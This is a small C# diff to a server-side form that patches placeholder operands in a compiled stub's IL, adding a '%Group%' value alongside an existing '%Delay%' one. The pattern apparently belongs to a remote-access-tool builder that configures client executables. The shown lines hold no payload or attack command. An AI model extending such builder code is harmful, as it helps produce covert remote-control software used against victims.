@@ -448,6 +448,9 @@ namespace Server.Forms
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
                                         method.Body.Instructions[i].Operand = numDelay.Value.ToString();
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
+                                        method.Body.Instructions[i].Operand = txtGroup.Text;
                                 }
                             }
                         }
